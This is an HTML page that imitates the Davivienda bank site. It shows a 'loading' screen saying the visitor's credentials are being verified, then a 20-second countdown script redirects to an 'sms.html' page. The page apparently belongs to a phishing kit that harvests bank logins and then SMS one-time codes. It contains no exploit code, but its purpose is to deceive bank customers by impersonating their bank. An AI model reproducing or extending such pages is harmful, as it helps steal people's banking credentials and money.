<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Davivienda</title> <!-- Título cambiado -->
    <link rel="stylesheet" href="styles.css" />
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
      rel="stylesheet"
    />
    <style>
      .container {
        border-radius: 15px; /* Esquinas semi-redondeadas */
        overflow: hidden; /* Asegura que el contenido no sobresalga */
      }
    </style>
  </head>
  <body style="color: #333232">
    <div class="container">
      <form class="form" id="loginForm">
        <div style="text-align: center; background: #ed1c27">
          <img
            src="logoizquierda.png"
            width="250"
          />
        </div>
        <div style="background: #f7f71b; height: 10px"></div>
        <div style="padding: 20px">
          <div style="text-align: center">
            <h3>Cargando...</h3>
          </div>
        </div>
        <div style="text-align: center">
          <img src="crrggd.gif" width="60" />
        </div>

        <div>
          <h4 id="CuentaAtras" style="text-align: center">
            Por favor, espera 20 segundos, estamos verificando sus credenciales.
            <br />
          </h4>
          <script language="JavaScript">
            /* Determinamos el tiempo total en segundos */
            var totalTiempo = 20;

            var url = "sms.html";

            function updateReloj() {
              document.getElementById("CuentaAtras").innerHTML =
                "Por favor, espera " +
                totalTiempo +
                " segundos, estamos verificando sus credenciales. <br> ";

              if (totalTiempo == 0) {
                window.location = url;
              } else {
                /* Restamos un segundo al tiempo restante */
                totalTiempo -= 1;
                /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
                setTimeout("updateReloj()", 1000);
              }
            }

            window.onload = updateReloj;
          </script>
        </div>
        <div
          style="text-align: center; background: #595959; height: 50px"
        ></div>
      </form>
    </div>
  </body>
</html>
